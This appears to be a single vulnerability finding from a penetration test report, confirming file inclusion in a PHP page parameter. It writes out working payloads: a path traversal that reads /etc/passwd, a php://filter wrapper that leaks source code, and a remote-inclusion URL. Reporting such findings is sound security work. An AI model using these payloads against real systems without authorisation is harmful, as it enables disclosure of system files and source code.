title: Local/Remote File Inclusion (LFI/RFI)
proof: Multiple inclusion vectors confirmed: (1) Path traversal: ?page=../../../../../etc/passwd returned /etc/passwd contents. (2) PHP filter: ?page=php://filter/convert.base64-encode/resource=include.php returned base64-encoded source code. (3) Remote inclusion: ?page=http://127.0.0.1:8080/phpinfo.php executed and returned phpinfo. Full file disclosure and potentially RFI.
